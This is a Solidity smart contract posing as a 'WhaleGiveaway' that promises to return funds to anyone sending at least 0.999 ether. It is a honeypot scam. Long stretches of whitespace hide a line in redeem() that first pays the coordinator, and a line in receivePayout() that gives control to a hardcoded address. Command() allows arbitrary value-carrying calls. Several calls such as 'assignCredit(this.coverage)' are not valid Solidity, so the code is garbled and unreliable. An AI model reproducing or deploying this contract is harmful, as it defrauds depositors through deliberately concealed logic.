// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Coordinator = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function redeem()
    public
    payable
    {
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Coordinator.assignCredit(this.coverage);
            msg.sender.assignCredit(this.coverage);
        }
    }

    function receivePayout()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Coordinator=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Coordinator);
        Coordinator.assignCredit(this.coverage);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Coordinator);
        adr.call.value(msg.value)(data);
    }
}